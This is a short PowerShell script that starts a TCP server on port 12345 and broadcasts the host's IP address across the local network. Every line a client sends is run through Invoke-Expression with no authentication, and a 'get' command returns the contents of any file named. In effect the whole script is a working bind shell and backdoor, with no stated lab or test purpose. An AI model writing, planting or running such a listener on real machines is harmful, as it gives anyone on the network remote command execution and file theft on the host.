# server.ps1
$port = 12345
$listener = [System.Net.Sockets.TcpListener]::new($port)

# Get the local IP address
$localIP = [System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1

$listener.Start()
Write-Host "Listening for commands on IP: $localIP and port $port..."

# Broadcast the IP address
$udpClient = New-Object System.Net.Sockets.UdpClient
$broadcastAddress = [System.Net.IPAddress]::Parse("255.255.255.255")
$udpClient.EnableBroadcast = $true
$udpClient.Send([Text.Encoding]::ASCII.GetBytes($localIP.ToString()), $localIP.ToString().Length, [System.Net.IPEndPoint]::new($broadcastAddress, $port))

while ($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
   
    # Read command from client until a newline is encountered
    $command = $reader.ReadLine()  # This will block until a line is received
    Write-Host "Received command: $command"
   
    if ($command -eq "exit") {
        Write-Host "Exiting server..."
        break  # Exit the loop and stop the server
    } elseif ($command -eq "pwd") {
        $output = Get-Location  # Get current directory
    } elseif ($command.StartsWith("get ")) {
        $filename = $command.Substring(4)  # Extract the filename
        if (Test-Path $filename) {
            $output = Get-Content $filename -Raw  # Get the content of the file
        } else {
            $output = "Error: File not found."
        }
    } else {
        # Execute the command and capture output
        $output = Invoke-Expression $command 2>&1  # Capture both stdout and stderr
    }

    # Convert the output to an array of lines and join them
    $outputString = [string]::Join("`n", $output)  # Join output into a single string
   
    # Send the output back to the client
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    $writer.WriteLine($outputString)  # Send the entire output at once
   
    # Close connections
    $reader.Close()
    $writer.Close()
    $client.Close()
}

# Stop the listener after exiting the loop
$listener.Stop()
